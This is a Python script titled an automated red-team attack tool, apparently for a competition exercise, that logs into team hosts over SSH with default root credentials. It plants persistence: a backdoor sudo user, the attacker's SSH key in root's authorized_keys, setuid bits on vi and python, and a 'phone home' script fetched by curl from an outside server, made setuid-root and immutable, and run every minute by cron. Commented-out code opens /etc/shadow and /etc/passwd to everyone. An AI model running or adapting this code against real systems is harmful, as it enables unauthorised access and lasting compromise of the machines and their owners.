################################################################################
# Author: Trenton Taylor                                                       #
# Started: 9/27/2018                                                           #
# Purpose: Automated Red Team Attack Tool                                      #
################################################################################

from pexpect import pxssh
import multiprocessing
import datetime
from os.path import expanduser


class Host:
    def __init__(self, team_number, name, last_octet=0, base_ip=[172, 25, 20, 0], username="root", password="changeme"):
        self.ip = "%d.%d.%d.%d" % (base_ip[0], base_ip[1], base_ip[2] + team_number, last_octet)
        self.last_octet = last_octet
        self.username = username
        self.password = password
        self.team = team_number
        self.name = name

class Team:
    def __init__(self, team_number):
        self.number = team_number
        self.ubuntu = Host(team_number, "dns", last_octet=23)
        self.centos = Host(team_number, "ecom", last_octet=11)
        self.pfsense = Host(team_number, "pfsense", last_octet=2)

def main():
    last_octet = {}
    last_octet['ubuntu'] = 23
    last_octet['centos'] = 11
    last_octet['pfsense'] = 2

    teams_numbers = range(1,3)
    teams = []

    for i in teams_numbers:
        teams.append(Team(i))
        print(i)

    for team in teams:
        print(team.number)
        print(team.ubuntu.ip)
        e_process = multiprocessing.Process(target=universal_linux_attack, args=[team.ubuntu])
        e_process.start()
        e_process = multiprocessing.Process(target=universal_linux_attack, args=[team.centos])
        e_process.start()
        e_process = multiprocessing.Process(target=centos_attacks, args=[team.centos])
        e_process.start()
    
        #universal_linux_attack(team.ubuntu)
        print(team.centos.ip)
        #universal_linux_attack(team.centos)
        print(team.pfsense.ip)
    
    e_process.join()

def log_line(message, host, print_flag=False):
    file_name = "team{0}-{1}.log".format(host.team, host.name)
    with open(file_name, "a") as log:
        log.write(message)
    if print_flag:
        print(message)

def get_ssh_pub():
    home = expanduser("~")
    filename = "{}/.ssh/id_rsa.pub".format(home)
    rsa_pub = ""
    try:
        with open(filename, "r") as f:
            rsa_pub = f.read()
    except Exception as e:
        print(e)
        exit(1)

    return rsa_pub

def pfsense_attacks(host):
    pass

def universal_linux_attack(host):
    
    
    print("Creating SSH session on {}.".format(host.ip))
    # Create SSH session
    ssh = pxssh.pxssh()
    ssh.login(host.ip, host.username, password=host.password)

    ssh.sendline('/bin/true')
    ssh.prompt()
    
    # add user
    username = "tom"
    password = "hunter2"
    user_add_cmd = "useradd -m -d /home/{0}/ -s /bin/bash {0}".format(username)
    
    
    log_line("Adding user {0} with password \'{1}\' to {2}".format(username, password, host.ip), host, print_flag=True)
    
    ssh.sendline(user_add_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

    user_passwd_cmd = "passwd {0}".format(username)
    ssh.sendline(user_passwd_cmd)
    ssh.expect("password: ")
    ssh.sendline(password)
    ssh.expect("password: ")
    ssh.sendline(password)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    
    # add user to sudoers
    log_line("Adding user {0} to sudoers on {1}.".format(username, host.ip), host, print_flag=True)
    sudo_add_cmd = "usermod -a -G admin {0} || usermod -a -G wheel {0}".format(username)
    ssh.sendline(sudo_add_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

    # Add SSH keys
    user_directories = {
        "root" : "/root",
        username : "/home/{}".format(username)
    }
    user_group = {
        "root" : "root",
        username : username
    }
    ssh_pub_key = get_ssh_pub()

    for user, directory in user_directories.items():
        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
        
        authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)

        ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)

        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print_flag=True)
        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
        
        commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
        for command in commands_to_run:  
            ssh.sendline(command)
            
            ssh.prompt()
            log_line(ssh.before.decode('utf8'), host)

    
    # setuid on vi
    setuid_vi_cmd = "chmod u+s /usr/bin/vi"
    log_line("Turning on setuid bit for /usr/bin/vi on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(setuid_vi_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    
    # setuid on python
    setuid_vi_cmd = "chmod u+s /usr/bin/python"
    log_line("Turning on setuid bit for /usr/bin/python on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(setuid_vi_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

    ## Mark team numbers
    mark_team_cmd = "echo -n {} > /etc/team".format(host.team)
    log_line("Logging team number for host on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(mark_team_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    """
    # ez mode /etc/shadow
    shadow_perms_cmd = "chmod 777 /etc/shadow"
    ssh.prompt()
    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(shadow_perms_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    
    # ez mode /etc/passwd
    passwd_perms_cmd = "chmod 777 /etc/passwd"
    
    log_line("Setting permissions to 777 on /etc/shadow on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(passwd_perms_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

     # ez mode /etc/group
    group_perms_cmd = "chmod 777 /etc/group"
    
    log_line("Setting permissions to 777 on /etc/group on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(group_perms_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    """

    #netcat_port = "1{}{}".format(host.team, host.last_octet)
    # https://stackoverflow.com/questions/4880290/how-do-i-create-a-crontab-through-a-script
    ssh.close()


def ubuntu_attacks(host):
    # Replace upstream DNS with red team villainy
    # sudo update-rc.d bind disable
    ssh = pxssh.pxssh()
    ssh.login(host.ip, host.username, password=host.password)

     # ez mode /etc/group
    wget_phonehome_cmd = "wget {}/phonehome.py -O /usr/bin/etph" 
    log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(wget_phonehome_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    """


    ## Add ssh key to php
    # Add SSH keys
    user_directories = {
        "php" : "/home/php"
    }
    user_group = {
        "php" : "root"
    }

    ssh_pub_key = get_ssh_pub()

    for user, directory in user_directories.items():
        sshdir_make_cmd = "mkdir -p \'{}/.ssh\'".format(directory)
        sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{2} {1}".format(user, directory, user_group[user])
        
        authorized_keys_file = "{}/.ssh/authorized_keys".format(directory)

        ssh_add_cmd = "echo \"{0}\" >> {1}".format(ssh_pub_key, authorized_keys_file)

        log_line("Adding SSH key to user {0} at {1} to sudoers on {2}.".format(user, authorized_keys_file, host.ip), host, print_flag=True)
        authorized_perms_cmd = "chmod 600 {1} && chown {0}:{2} {1}".format(user, authorized_keys_file, user_group[user])
        
        commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
        for command in commands_to_run:  
            ssh.sendline(command)
            ssh.prompt()
            log_line(ssh.before.decode('utf8'), host)
    pass
    """

def centos_attacks(host):
    server_ip = "10.0.0.101"
    ssh = pxssh.pxssh()
    ssh.login(host.ip, host.username, password=host.password)
    # sudo update-rc.d httpd disable
    # lol
         # ez mode /etc/group
    wget_phonehome_cmd = "curl {}/phonehome.py -o /usr/bin/etph".format(server_ip)
    log_line("Downloading phone home script on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(wget_phonehome_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

    ## Chmod phone home
    phonehome_perms_cmd = "chmod 6755 /usr/bin/etph"
    log_line("Setting permissions to 6755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(phonehome_perms_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    
    ## Chmod phone home
    phonehome_immute_cmd = "chattr +i /usr/bin/etph"
    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(phonehome_immute_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)

    ## Chown phone home
    phonehome_chown_cmd = "chown root:root /usr/bin/etph"
    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(phonehome_chown_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    
    ## Chown phone home
    phonehome_crontab_cmd = r'echo -e "$(crontab -l)\n* * * * * /usr/bin/etph | crontab -"'
    log_line("Setting permissions to 755 on /usr/bin/etph on {}".format(host.ip), host, print_flag=True)
    ssh.sendline(phonehome_crontab_cmd)
    ssh.prompt()
    log_line(ssh.before.decode('utf8'), host)
    

main()